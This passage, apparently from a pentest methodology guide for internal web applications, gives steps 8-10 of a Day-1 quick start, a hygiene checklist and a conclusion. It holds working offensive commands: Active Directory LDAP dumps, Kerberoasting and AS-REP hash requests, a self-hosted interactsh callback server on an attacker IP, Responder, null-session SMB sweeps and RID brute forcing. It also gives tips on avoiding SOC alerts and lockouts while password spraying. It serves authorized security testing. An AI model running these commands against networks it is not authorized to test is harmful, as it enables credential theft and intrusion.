+**8. LDAP dump for HTTP SPNs (find every internal web app via AD):**
+```bash
+nxc ldap $DC_IP -u "$LDAPUSER" -p "$LDAPPASS" -d $DOMAIN --users --groups --computers > creds/ldap.dump
+ldapsearch -x -LLL -H ldap://$DC_IP \
+  -D "$LDAPUSER@$DOMAIN" -w "$LDAPPASS" \
+  -b "$(echo dc=$DOMAIN | sed 's/\./,dc=/g')" \
+  '(servicePrincipalName=HTTP/*)' servicePrincipalName sAMAccountName dNSHostName \
+  > creds/http-spns.ldif
+impacket-GetUserSPNs $DOMAIN/$LDAPUSER:"$LDAPPASS" -dc-ip $DC_IP -request -outputfile creds/roast.hashes
+impacket-GetNPUsers $DOMAIN/$LDAPUSER:"$LDAPPASS" -dc-ip $DC_IP -request -outputfile creds/asrep.hashes
+```
+
+**9. Start self-hosted interactsh-server:**
+```bash
+sudo systemctl stop systemd-resolved
+sudo interactsh-server -domain oast.corp.local \
+  -ip $ATTACKER_IP -listen-ip 0.0.0.0 \
+  -http-port 80 -https-port 443 -ldap -smb \
+  -token $(openssl rand -hex 32) \
+  -skip-acme -disable-update-check 2>&1 | tee evidence/interactsh.log &
+export INTERACT_TOKEN=<token from above>
+interactsh-client -server https://oast.corp.local -token $INTERACT_TOKEN -v
+```
+
+**10. Responder analyze + NetExec null SMB sweep:**
+```bash
+sudo responder -I eth0 -A 2>&1 | tee evidence/responder-analyze.log &
+nxc smb $TARGET_CIDR -u '' -p '' --shares 2>&1 | tee recon/nxc.null.smb
+nxc smb $TARGET_CIDR -u 'guest' -p '' --shares 2>&1 | tee recon/nxc.guest.smb
+nxc smb $DC_IP -u '' -p '' --rid-brute 10000 2>&1 | tee recon/nxc.rid.dc
+nxc smb $TARGET_CIDR --gen-relay-list recon/smb-no-signing.txt
+```
+
+---
+
+## Cross-cutting hygiene checklist
+
+- Corp root CA installed system-wide + exported `SSL_CERT_FILE` / `REQUESTS_CA_BUNDLE` / `CURL_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS`.
+- `NO_PROXY` set for RFC1918 and client TLDs **before** any proxy env var — otherwise internal scans route through corp egress proxy, get logged, and generate SOC alerts.
+- `-disable-update-check` / `--disable-update` / `--no-update` on every PD/Python tool — silent internet attempts burn minutes and leak intent.
+- `--skip-validation` (puredns) mandatory — default validation hits 8.8.8.8.
+- `nxc smb $DC --pass-pol` **before** any spray to avoid account lockouts. One password × many users; never reverse.
+- Lockout observation window typically 30 min; stay `attempts-1` per user per window.
+- Verify EPA + LDAP channel binding before planning relay — `nxc ldap -M ldap-checker`, `nxc smb --gen-relay-list`.
+- Self-hosted interactsh is **non-negotiable**; jwt_tool's `jwksloc` and Dalfox's `-b` must point at it, not public OAST.
+- Rate-limit nuclei/commix/sqlmap conservatively — legacy intranet gear crashes under default aggression. Never run `dos` or `fuzz` tagged templates without written approval.
+- Exclude printer and OT VLANs from all scans.
+- Evidence discipline: `F001-step1-<desc>.png`; capture URL bar + timestamp; pcap per auth finding; asciinema for multi-step exploits; blur sensitive tokens.
+- Keep a shared OAST log with timestamps, source IPs, and payload IDs — every callback is evidence.
+- **SPN = target list.** If you have any domain creds at all, the `(servicePrincipalName=HTTP/*)` LDAP query is the single highest-value step of the whole engagement for internal web app discovery.
+
+## Conclusion
+
+The defining shift from public bug-bounty methodology to internal web app pentesting is a **complete inversion of the recon model**: you lose every passive intel source (CT logs, Wayback, Shodan, Chaos, GitHub dorks, AlienVault, VirusTotal, public Collaborator) and gain two substantially more powerful active primitives — **Active Directory as an oracle** (every `HTTP/*` SPN in LDAP is literally a registered internal web app) and **on-network OAST** (self-hosted interactsh catches blind vulns that external Collaborator would for public apps). The toolbox pivot reflects this: Impacket/ntlmrelayx/Kerbrute/NetExec move from nice-to-have to first-class web pentest tools because internal web apps live inside AD auth; `puredns` against internal resolvers replaces `subfinder`; katana + jsluice + xnLinkFinder replace gau + waybackurls + ParamSpider; custom Nuclei templates catch the internal-specific exposures (`/actuator/*`, `/.git/`, `/swagger`, ViewState, JBoss legacy) that public templates under-cover. Air-gap prep is the single most leveraged investment — a day spent staging Nuclei templates, wordlists, Python wheels, Go binaries, corp CA trust, and self-hosted interactsh before going on site converts a hostile offline environment into the testing platform you actually want. Once that's done, the methodology flows: L2/DNS/port → httpx + screenshots → vhost + content + JS + param discovery → nuclei + tech-specific scanners → manual exploitation through Burp (with NTLM/Kerberos configured) → NTLM relay and AD-aware auth attacks → internal git/share secret hunting → reporting with local-first note tools. The Day-1 quick-start commands in Part 9 execute that flow in its minimum-viable form; the tool-by-tool sections deepen each phase as the engagement demands.
